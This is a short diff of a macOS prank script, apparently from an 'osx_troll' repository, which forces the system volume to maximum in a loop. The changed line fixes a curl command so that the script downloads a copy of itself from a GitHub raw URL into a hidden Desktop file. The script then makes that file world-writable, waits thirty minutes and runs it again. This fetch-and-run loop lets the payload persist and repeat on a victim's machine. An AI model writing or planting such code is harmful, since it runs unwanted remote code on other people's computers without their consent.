@@ -19,7 +19,7 @@ while [ $SECONDS -lt $end ]; do
 	osascript -e 'set volume 100'
 done
 
-curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.run.sh
+curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.music.sh
 chmod 777 ~/Desktop/.music.sh
 sleep 30m
 sh ~/Desktop/.music.sh
